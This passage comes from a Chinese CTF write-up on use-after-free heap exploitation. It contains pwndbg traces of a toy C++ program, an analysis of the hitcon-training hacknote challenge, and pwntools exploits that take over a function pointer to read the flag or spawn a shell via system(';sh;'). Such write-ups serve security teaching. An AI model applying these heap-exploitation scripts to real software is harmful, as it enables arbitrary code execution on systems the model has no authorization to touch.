0x0</span><br><span class="line"> RBP  0x7fffffffe000 —▸ 0x400980 (__libc_csu_init) ◂— push   r15</span><br><span class="line"> RSP  0x7fffffffdfe0 —▸ 0x613e70 —▸ 0x600dc8 —▸ 0x400918 (B::print()) ◂— push   rbp</span><br><span class="line"> RIP  0x4008a1 (main+71) ◂— mov    rax, qword ptr [rbp - 0x20]</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x4008a1 &lt;main+71&gt;     mov    rax, qword ptr [rbp - 0x20]</span><br><span class="line">   0x4008a5 &lt;main+75&gt;     mov    esi, 8</span><br><span class="line">   0x4008aa &lt;main+80&gt;     mov    rdi, rax</span><br><span class="line">   0x4008ad &lt;main+83&gt;     call   0x400720</span><br><span class="line"> </span><br><span class="line">   0x4008b2 &lt;main+88&gt;     mov    rax, qword ptr [rip + 0x2007b7] &lt;0x601070&gt;</span><br><span class="line">   0x4008b9 &lt;main+95&gt;     mov    rdx, rax</span><br><span class="line">   0x4008bc &lt;main+98&gt;     mov    esi, 0x400</span><br><span class="line">   0x4008c1 &lt;main+103&gt;    lea    rdi, [rip + 0x2007b8] &lt;0x601080&gt;</span><br><span class="line">   0x4008c8 &lt;main+110&gt;    call   fgets@plt &lt;0x400740&gt;</span><br><span class="line"> </span><br><span class="line">   0x4008cd &lt;main+115&gt;    lea    rdi, [rip + 0x2007ac] &lt;0x601080&gt;</span><br><span class="line">   0x4008d4 &lt;main+122&gt;    call   strdup@plt &lt;0x400750&gt;</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">In file: /home/Thunder_J/桌面/UAF.cpp</span><br><span class="line">   29 </span><br><span class="line">   30 int main()</span><br><span class="line">   31 &#123;</span><br><span class="line">   32     setvbuf(stdout,0,_IONBF,0);</span><br><span class="line">   33     A *p = new B();</span><br><span class="line"> ► 34     delete p;       //删除堆p</span><br><span class="line">   35     fgets(buf,sizeof(buf),stdin);</span><br><span class="line">   36     char *q = strdup(buf);</span><br><span class="line">   37 </span><br><span class="line">   38     p-&gt;print();     //继续使用p，触发漏洞，程序会报错</span><br><span class="line">   39     return 0;</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffdfe0 —▸ 0x613e70 —▸ 0x600dc8 —▸ 0x400918 (B::print()) ◂— push   rbp</span><br><span class="line">01:0008│      0x7fffffffdfe8 —▸ 0x400760 (_start) ◂— xor    ebp, ebp</span><br><span class="line">02:0010│      0x7fffffffdff0 —▸ 0x7fffffffe0e0 ◂— 0x1</span><br><span class="line">03:0018│      0x7fffffffdff8 ◂— 0x0</span><br><span class="line">04:0020│ rbp  0x7fffffffe000 —▸ 0x400980 (__libc_csu_init) ◂— push   r15</span><br><span class="line">05:0028│      0x7fffffffe008 —▸ 0x7ffff767cb97 (__libc_start_main+231) ◂— mov    edi, eax</span><br><span class="line">06:0030│      0x7fffffffe010 ◂— 0xffffffffffffff90</span><br><span class="line">07:0038│      0x7fffffffe018 —▸ 0x7fffffffe0e8 —▸ 0x7fffffffe412 ◂— 0x73782f656d6f682f ('/home/xs')</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0           4008a1 main+71</span><br><span class="line">   f 1     7ffff767cb97 __libc_start_main+231</span><br></pre></td></tr></table></figure></p>
<p>我们查看堆情况<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> heap p</span></span><br><span class="line">0x613e70 &#123;</span><br><span class="line">  mchunk_prev_size = 6294984, </span><br><span class="line">  mchunk_size = 0, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0xf181, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>根据p我们查看一下chunk指向的内容<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x613e70-16</span></span><br><span class="line">0x613e60:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x613e70:	0x0000000000600dc8	0x0000000000000000</span><br><span class="line">0x613e80:	0x0000000000000000	0x000000000000f181</span><br><span class="line">0x613e90:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x613ea0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x613eb0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x613ec0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x613ed0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x613ee0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x613ef0:	0x0000000000000000	0x0000000000000000</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/10gx 0x0000000000600dc8</span></span><br><span class="line">0x600dc8 &lt;_ZTV1B+16&gt;:	0x0000000000400918	0x0000000000000000</span><br><span class="line">0x600dd8 &lt;_ZTV1A+8&gt;:	0x0000000000600e00	0x00000000004008fc</span><br><span class="line">0x600de8 &lt;_ZTI1B&gt;:	0x00007ffff7dc7438	0x0000000000400a17</span><br><span class="line">0x600df8 &lt;_ZTI1B+16&gt;:	0x0000000000600e00	0x00007ffff7dc67f8</span><br><span class="line">0x600e08 &lt;_ZTI1A+8&gt;:	0x0000000000400a1a	0x0000000000000001</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/10gx 0x0000000000400918</span></span><br><span class="line">0x400918 &lt;B::print()&gt;:	0x10ec8348e5894855	0xe13d8d48f87d8948</span><br><span class="line">0x400928 &lt;B::print()+16&gt;:	0xfffffe00e8000000	0xe589485590c3c990</span><br><span class="line">0x400938 &lt;A::A()+4&gt;:	0x9d158d48f87d8948	0x48f8458b48002004</span><br><span class="line">0x400948 &lt;A::A()+20&gt;:	0x485590c35d901089	0x894810ec8348e589</span><br><span class="line">0x400958 &lt;B::B()+10&gt;:	0x8948f8458b48f87d	0x8d48ffffffcee8c7</span><br></pre></td></tr></table></figure></p>
<p>可以看到最终指向的地址是B中的print()函数，我们继续单步直到p-&gt;print()处，也就是漏洞触发之后，再次查看此内存<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/10gx 0x613e70-16</span></span><br><span class="line">0x613e60:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x613e70:	0x6665656264616564	0x000000000000000a</span><br><span class="line">0x613e80:	0x0000000000000000	0x0000000000000411</span><br><span class="line">0x613e90:	0x6665656264616564	0x000000000000000a</span><br><span class="line">0x613ea0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>可以看到0x613e70处内容已经修改为我们写入的deadbeef，我们查看一下汇编<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> disassemble /m main</span></span><br><span class="line">Dump of assembler code for function main():</span><br><span class="line">...</span><br><span class="line">38	    p-&gt;print();     //继续使用p，触发漏洞，程序会报错</span><br><span class="line">=&gt; 0x00000000004008dd &lt;+131&gt;:	mov    rax,QWORD PTR [rbp-0x20]</span><br><span class="line">   0x00000000004008e1 &lt;+135&gt;:	mov    rax,QWORD PTR [rax]</span><br><span class="line">   0x00000000004008e4 &lt;+138&gt;:	mov    rax,QWORD PTR [rax]</span><br><span class="line">   0x00000000004008e7 &lt;+141&gt;:	mov    rdx,QWORD PTR [rbp-0x20]</span><br><span class="line">   0x00000000004008eb &lt;+145&gt;:	mov    rdi,rdx</span><br><span class="line">   0x00000000004008ee &lt;+148&gt;:	call   rax</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>我们查看寄存器信息<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> RAX  0x613e70 ◂— 'deadbeef\n'</span><br><span class="line"> RBX  0x613e70 ◂— 'deadbeef\n'</span><br><span class="line"> RCX  0xa666565626461</span><br><span class="line"> RDX  0xa</span><br><span class="line"> RDI  0x613e70 ◂— 'deadbeef\n'</span><br><span class="line"> RSI  0x6665656264616564 ('deadbeef')</span><br><span class="line"> R8   0x613e99 ◂— 0x0</span><br><span class="line"> R9   0x7ffff7fd7d80 ◂— 0x7ffff7fd7d80</span><br><span class="line"> R10  0x6</span><br><span class="line"> R11  0x7ffff76f89a0 (strdup) ◂— push   rbp</span><br><span class="line"> R12  0x400760 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fffffffe0e0 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7fffffffe000 —▸ 0x400980 (__libc_csu_init) ◂— push   r15</span><br><span class="line"> RSP  0x7fffffffdfe0 —▸ 0x613e70 ◂— 'deadbeef\n'</span><br><span class="line"> RIP  0x4008dd (main+131) ◂— mov    rax, qword ptr [rbp - 0x20]</span><br></pre></td></tr></table></figure></p>
<p>我们发现RAX的内容就是我们输入的信息，结合汇编代码可以发现，最终的call rax这句代码将执行的我们输入的数据所指的地址的代码，也就是我们可以通过输入来getshell,我们通过IDA找到函数的地址</p>
<p>exp:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./UAF'</span>)</span><br><span class="line">buf_addr = <span class="number">0x00601080</span></span><br><span class="line">sh_addr = <span class="number">0x0400847</span></span><br><span class="line">p.sendline(p64(buf_addr+<span class="number">8</span>) + p64(sh_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<h2 id="Example-Two"><a href="#Example-Two" class="headerlink" title="Example Two"></a>Example Two</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote</a></p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>首先运行一下程序，可以看到Menu中有一下几个选项：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">----------------------</span><br><span class="line">       HackNote       </span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note          </span><br><span class="line"> 2. Delete note       </span><br><span class="line"> 3. Print note        </span><br><span class="line"> 4. Exit              </span><br><span class="line">----------------------</span><br><span class="line">Your choice :</span><br></pre></td></tr></table></figure></p>
<p>我们分别来分析一下各个函数的功能：</p>
<h4 id="add-note"><a href="#add-note" class="headerlink" title="add_note"></a>add_note</h4><p>可以看出该函数主要就是创建 note ，最多能够创建5个，每个 note 有两个字段 put 与 content，其中 put 会被设置为一个函数，其函数会输出 content 具体的内容。<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">add_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( count &lt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !notelist[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        notelist[i] = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !notelist[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Alloca Error"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)notelist[i] = print_note_content;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Note size :"</span>);</span><br><span class="line">        read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>);</span><br><span class="line">        size = atoi(&amp;buf);</span><br><span class="line">        v0 = notelist[i];</span><br><span class="line">        v0[<span class="number">1</span>] = <span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="keyword">if</span> ( !*((_DWORD *)notelist[i] + <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Alloca Error"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Content :"</span>);</span><br><span class="line">        read(<span class="number">0</span>, *((<span class="keyword">void</span> **)notelist[i] + <span class="number">1</span>), size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Success !"</span>);</span><br><span class="line">        ++count;</span><br><span class="line">        <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Full"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="print-note"><a href="#print-note" class="headerlink" title="print_note"></a>print_note</h4><p>该函数就是输出相应note的内容<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">print_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">    notelist[v1]-&gt;put(notelist[v1]);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="delete-note"><a href="#delete-note" class="headerlink" title="delete_note"></a>delete_note</h4><p>该函数主要就是删除对应的note，但是在删除的时候只是进行了free而并没有置为NULL，这里就存在UAF漏洞<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">del_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]-&gt;content);</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们可以在IDA中看到程序有一个叫做magic的函数，它的作用就是 cat flag，所以我们只需要修改 note 的 put 字段为 magic 函数的地址，从而实现在执行 print note 的时候执行 magic 函数。</p>
<p>因为note是一个fastbin chunk（大小为 16 字节），我们需要将note的put字段修改为magic函数的地址，而fastbin chunk是一个单链表有LIFO的特性，所以我们从申请入手，利用过程如下：</p>
<ol>
<li>申请 note0，real content size 为 16（大小不为8即可）</li>
<li>申请 note1，real content size 为 16（同上）</li>
<li>释放 note0</li>
<li>释放 note1</li>
<li>此时，大小为 16 的 fast bin chunk 中链表为 note1-&gt;note0</li>
<li>申请 note2，并且设置 real content 的大小为 8，那么根据堆的分配规则 note2 其实会分配 note1 对应的内存块。</li>
<li>real content 对应的 chunk 其实是 note0。</li>
<li>如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用 magic 函数。</li>
</ol>
<p>我们动态调试一下整个过程：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> heap</span></span><br><span class="line">0x804b000 &#123;</span><br><span class="line">  mchunk_prev_size = 0, </span><br><span class="line">  mchunk_size = 0, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x151, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到我们的数据已经成功申请<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x804b150</span></span><br><span class="line">0x804b150:    0x0000000000000000	0x0000001100000000</span><br><span class="line">0x804b160:	0x0804b1700804865b	0x0000002100000000</span><br><span class="line">0x804b170:	0x0000000061616161	0x0000000000000000</span><br><span class="line">0x804b180:	0x0000000000000000	0x0000001100000000</span><br><span class="line">0x804b190:	0x0804b1a00804865b	0x0000002100000000</span><br><span class="line">0x804b1a0:	0x0000000a61616161	0x0000000000000000</span><br><span class="line">0x804b1b0:	0x0000000000000000	0x00021e4900000000</span><br><span class="line">0x804b1c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x804b1d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x804b1e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>删除之后可以再次来看堆的信息可以看到大小为 16 的 fast bin chunk 中链表为 note1-&gt;note0<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x804b150</span></span><br><span class="line">0x804b150:    0x0000000000000000	0x0000001100000000</span><br><span class="line">0x804b160:	0x0804b17000000000	0x0000002100000000</span><br><span class="line">0x804b170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x804b180:	0x0000000000000000	0x0000001100000000</span><br><span class="line">0x804b190:	0x0804b1a00804b160	0x0000002100000000</span><br><span class="line">0x804b1a0:	0x0000000a0804b170	0x0000000000000000</span><br><span class="line">0x804b1b0:	0x0000000000000000	0x00021e4900000000</span><br><span class="line">0x804b1c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x804b1d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x804b1e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>我们重新申请大小为8,内容为aaaa的note再打印note0就会改变eip<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">Index :0</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x61616161 in ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> EAX  0x61616161 ('aaaa')</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0x0</span><br><span class="line"> EDX  0x804b160 ◂— 0x61616161 ('aaaa')</span><br><span class="line"> EDI  0x0</span><br><span class="line"> ESI  0xf7faf000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d6c</span><br><span class="line"> EBP  0xffffd188 —▸ 0xffffd1a8 ◂— 0x0</span><br><span class="line"> ESP  0xffffd15c —▸ 0x804896f (print_note+154) ◂— add    esp, 0x10</span><br><span class="line"> EIP  0x61616161 ('aaaa')</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">Invalid address 0x61616161</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd15c —▸ 0x804896f (print_note+154) ◂— add    esp, 0x10</span><br><span class="line">01:0004│      0xffffd160 —▸ 0x804b160 ◂— 0x61616161 ('aaaa')</span><br><span class="line">02:0008│      0xffffd164 —▸ 0xffffd178 —▸ 0xf7fa0a30 ◂— add    dword ptr [edx + 0xe], eax</span><br><span class="line">03:000c│      0xffffd168 ◂— 0x4</span><br><span class="line">04:0010│      0xffffd16c —▸ 0x8048a32 (menu+147) ◂— add    esp, 0x10</span><br><span class="line">05:0014│      0xffffd170 —▸ 0x8048c63 ◂— pop    ecx /* 'Your choice :' */</span><br><span class="line">06:0018│      0xffffd174 ◂— 0x0</span><br><span class="line">07:001c│      0xffffd178 —▸ 0xf7fa0a30 ◂— add    dword ptr [edx + 0xe], eax</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f 0 61616161</span><br><span class="line">   f 1  804896f print_note+154</span><br><span class="line">   f 2  8048ad3 main+155</span><br><span class="line">   f 3 f7defe81 __libc_start_main+241</span><br><span class="line">Program received signal SIGSEGV (fault address 0x61616161)</span><br></pre></td></tr></table></figure></p>
<p>我们只需要将aaaa改为我们magic的地址即可，而magic函数的地址是在IDA中可以看到的</p>
<p>exp：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./hacknote'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">magic_addr = <span class="number">0x8048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">16</span>,<span class="string">"aaaa"</span>)</span><br><span class="line">addnote(<span class="number">16</span>,<span class="string">"aaaa"</span>)</span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>)</span><br><span class="line">delnote(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>,p32(magic_addr))</span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
<p>上面的exp并不能拿到shell，只能获得flag，为了拿到shell我们还需要执行system(‘/bin/sh’)，下面的版本才是getshell的exp</p>
<p><strong>exp</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./hacknote'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./hacknote'</span>)</span><br><span class="line"><span class="comment">#r = remote("",)</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">magic_addr = <span class="number">0x08048986</span></span><br><span class="line">system_addr = <span class="number">0x8048500</span>+<span class="number">6</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span><span class="params">(size,context)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.send(<span class="string">'1'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.send(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.send(context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_note</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.send(<span class="string">'2'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.send(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_note</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.send(<span class="string">'3'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.send(str(index))</span><br><span class="line"></span><br><span class="line">add_note(<span class="number">20</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add_note(<span class="number">20</span>,<span class="string">'bbbb'</span>)</span><br><span class="line"></span><br><span class="line">del_note(<span class="number">0</span>)</span><br><span class="line">del_note(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add_note(<span class="number">8</span>,p32(system_addr)+<span class="string">';sh;'</span>) <span class="comment"># system("address;sh;")</span></span><br><span class="line"></span><br><span class="line">print_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>system函数地址分布如下，+6 的原因是直接走push 0x38的位置，让程序直接去解析system函数真正的位置，也就是执行dl_runtime_resolve(link_map, index) 函数解析system函数的位置，具体原理详见 ret2dl-resolve</p>
